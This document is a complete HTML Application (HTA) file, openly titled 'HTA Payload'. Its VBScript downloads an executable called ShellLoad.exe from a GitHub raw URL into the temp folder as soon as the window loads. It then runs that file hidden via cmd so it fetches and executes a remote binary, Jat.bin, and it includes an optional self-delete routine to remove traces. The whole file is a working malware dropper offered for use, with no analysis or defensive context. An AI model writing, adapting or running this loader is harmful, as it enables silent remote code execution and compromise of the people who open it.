<html>
<head>
    <title>HTA Payload</title>
    <HTA:APPLICATION
        ID="htaPayload"
        APPLICATIONNAME="HTA Payload"
        BORDER="thin"
        SCROLL="no"
        SINGLEINSTANCE="yes"
        SYSMENU="yes"
    />
    <script language="VBScript">
    ' ==================
    ' CONFIG
    ' ==================
    Dim shellLoaderURL
    shellLoaderURL = "https://raw.githubusercontent.com/Magturn/Bat/main/update.exe"
    ' ^ Make sure this URL actually points to the raw file for ShellLoad.exe
    '   Example: https://raw.githubusercontent.com/<User>/<Repo>/<Branch>/ShellLoad.exe

    ' ==================
    ' MAIN
    ' ==================
    Sub Window_OnLoad()
        Dim shellLoaderPath

        ' 1) Download ShellLoad.exe to %TEMP%
        shellLoaderPath = DownloadFile(shellLoaderURL, "ShellLoad.exe")

        ' 2) Execute with the given arguments to download & run Jat.bin
        If shellLoaderPath <> "" Then
            ExecuteShellLoader shellLoaderPath
        Else
            MsgBox "Failed to download ShellLoad.exe", vbExclamation, "Error"
        End If
    End Sub

    ' ==================
    ' FUNCTIONS
    ' ==================
    Function DownloadFile(fileURL, fileName)
        ' Returns full local path if successful; otherwise, empty string
        On Error Resume Next

        Dim xmlHttp, adoStream, tempPath, localFile
        tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
        localFile = tempPath & "\" & fileName

        ' You can try MSXML2.ServerXMLHTTP.6.0 if you have TLS issues
        Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xmlHttp.Open "GET", fileURL, False
        xmlHttp.Send

        If xmlHttp.Status = 200 Then
            Set adoStream = CreateObject("ADODB.Stream")
            adoStream.Type = 1  ' adTypeBinary
            adoStream.Open
            adoStream.Write xmlHttp.ResponseBody
            adoStream.SaveToFile localFile, 2 ' adSaveCreateOverWrite
            adoStream.Close
            DownloadFile = localFile
        Else
            DownloadFile = ""
        End If
    End Function

    Sub ExecuteShellLoader(shellLoaderPath)
        On Error Resume Next

        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        
        ' Command line: ShellLoad.exe -d https://github.com/Magturn/Bat/raw/refs/heads/main/Jat.bin 1
        Dim cmd
        cmd = """" & shellLoaderPath & """ -d https://github.com/Magturn/Bat/raw/refs/heads/main/Jat.bin 1"
        
        ' Run silently (windowStyle=0), wait until it finishes (True)
        objShell.Run "cmd /c " & cmd, 0, True

        ' Optional: self-clean after execution
        'KillFile shellLoaderPath
    End Sub

    Sub KillFile(filePath)
        On Error Resume Next
        Dim fso
        Set fso = CreateObject("Scripting.FileSystemObject")
        If fso.FileExists(filePath) Then
            fso.DeleteFile filePath, True
        End If
    End Sub
    </script>
</head>
<body>
    <h3>HTA Payload</h3>
    <p>This HTA downloads ShellLoad.exe, then runs it with parameters to fetch and execute Jat.bin.</p>
</body>
</html>
